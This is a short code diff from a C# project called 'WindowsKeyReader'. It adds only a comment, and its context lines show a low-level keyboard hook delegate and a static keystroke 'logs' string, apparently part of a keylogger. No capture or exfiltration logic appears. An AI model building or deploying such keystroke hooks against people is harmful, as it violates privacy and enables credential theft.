@@ -45,7 +45,7 @@ namespace WindowsKeyReader
                     GetModuleHandle(curModule.ModuleName), 0);
             }
         }
-
+        //ricus comment
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         string line = "";
         private static string logs = "";// skryf alles wat mens log
